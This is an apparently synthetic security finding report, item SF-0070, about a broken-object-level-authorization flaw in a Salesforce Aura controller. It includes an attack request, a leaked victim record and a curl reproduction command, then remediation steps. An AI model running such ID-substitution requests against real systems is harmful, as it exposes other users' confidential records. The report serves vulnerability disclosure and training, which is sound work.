# Security Analysis Report
**System:** PayBridge Transaction API (Salesforce-Integrated)
**Domain:** FinTech / Payment Processing
**Example ID:** SF-0070
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 10.2 | Parameter escalation on `OpportunityController.getOpportunity` — attacker reads fintech transaction Opportunity records outside their session scope |

---

## Finding 1 — BOLA: Parameter Escalation on Opportunity Object (Pattern 10.2)

### Summary
The Apex controller `OpportunityController` on PayBridge Transaction API (`be5b5c9d.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Opportunity object. Per §5.0 Pattern 10.2, the attacker escalates their session scope by substituting `opportunityId` to read any victim's transaction Opportunity record.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getOpportunityDetails(String opportunityId, ...)` while the Aura descriptor in §6.0 is `c.OpportunityController.getOpportunity`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 10.2 — Parameter escalation (own session scope extension)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://be5b5c9d.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://be5b5c9d.lightning.force.com/aura
Authorization: Bearer 00DBE5B5C9D!ARbe5b5c9d...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DBE5B5C9D!ARbe5b5c9d...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"0015C9D","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Opportunity Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0015C9D", "Name": "Victim Opportunity Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-75-5143"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DBE5B5C9D!ARbe5b5c9d..."
curl -s -X POST "https://be5b5c9d.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"0015C9D","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-75-5143
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class OpportunityController { ... }`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
